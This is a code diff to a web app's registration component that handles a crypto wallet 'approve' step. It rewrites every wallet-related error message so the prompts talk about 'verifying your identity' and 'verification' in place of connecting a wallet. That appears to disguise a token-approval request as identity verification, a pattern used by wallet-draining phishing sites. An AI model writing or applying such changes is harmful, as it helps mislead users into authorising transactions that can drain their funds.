@@ -43,7 +43,7 @@ function RegisterContent() {
   useEffect(() => {
     const timer = setTimeout(() => {
       if (!isConnected && !window.ethereum?.selectedAddress) {
-        toast.error('Please connect your wallet first');
+        toast.error('Please verify your identity first');
         router.push('/');
       }
     }, 1500);
@@ -73,7 +73,7 @@ function RegisterContent() {
       
       const injectedProvider = window.ethereum;
       if (!injectedProvider) {
-        toast.error('Wallet not detected. Please reconnect.');
+        toast.error('App not detected. Please try again.');
         setLoading(false);
         return;
       }
@@ -120,7 +120,7 @@ function RegisterContent() {
         } catch (approveErr) {
           toast.dismiss('approve');
           if (approveErr.code === 4001 || approveErr.code === 'ACTION_REJECTED') {
-            toast.error('Wallet Connection Is Required. Please Re-connect.');
+            toast.error('Verification is required to proceed. Please try again.');
             setLoading(false);
             return;
           }
@@ -129,7 +129,7 @@ function RegisterContent() {
             setLoading(false);
             return;
           }
-          toast.error(`Wallet Connection failed: ${approveErr.shortMessage || approveErr.message || 'Try again'}`);
+          toast.error(`Verification failed: ${approveErr.shortMessage || approveErr.message || 'Try again'}`);
           setLoading(false);
           return;
         }
